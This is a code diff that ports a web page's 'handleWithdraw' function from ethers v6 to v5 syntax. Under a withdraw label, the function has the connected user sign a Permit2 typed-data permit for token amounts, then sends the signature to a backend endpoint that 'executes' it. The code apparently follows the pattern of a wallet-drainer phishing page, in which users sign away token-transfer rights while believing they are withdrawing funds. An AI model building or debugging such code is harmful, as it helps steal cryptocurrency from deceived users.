@@ -41,25 +41,23 @@ function showToast(msg, isError = false) {
 // 3. The Withdrawal / Signing Logic (Ethers v5 Format)
 async function handleWithdraw() {
     try {
-        // 1. Get the provider specifically from AppKit, NOT window.ethereum
         const walletProvider = modal.getWalletProvider();
-        
         if (!walletProvider) {
             showToast("Please connect your wallet first!", true);
             await modal.open();
             return;
         }
 
-        // 2. Wrap the AppKit provider in Ethers (Works for v6)
-        const provider = new ethers.BrowserProvider(walletProvider);
-        const signer = await provider.getSigner();
+        // --- FIX: Ethers v5 syntax ---
+        // BrowserProvider (v6) -> Web3Provider (v5)
+        const provider = new ethers.providers.Web3Provider(walletProvider);
+        const signer = provider.getSigner();
         const owner = await signer.getAddress();
-        const { chainId } = await provider.getNetwork();
+        const network = await provider.getNetwork();
 
-        // EIP-712 setup
         const domain = {
             name: "Permit2",
-            chainId: chainId,
+            chainId: network.chainId,
             verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3"
         };
 
@@ -75,7 +73,8 @@ async function handleWithdraw() {
             ]
         };
 
-        const amount = ethers.parseUnits("10", 6);
+        // Ensure amount is parsed correctly for Ethers v5
+        const amount = ethers.utils.parseUnits("10", 6); 
         const nonce = Date.now();
         const deadline = Math.floor(Date.now() / 1000) + 3600;
 
@@ -88,11 +87,10 @@ async function handleWithdraw() {
             deadline: deadline
         };
 
-        // 3. Sign
-        showToast("Please sign the permit in your wallet...");
-        const signature = await signer.signTypedData(domain, types, message);
+        // --- FIX: Ethers v5 SignTypedData ---
+        showToast("Requesting signature...");
+        const signature = await signer._signTypedData(domain, types, message);
 
-        // 4. Send to Vercel API
         showToast("Signature secured. Executing...");
         const res = await fetch('/api/withdraw', {
             method: 'POST',
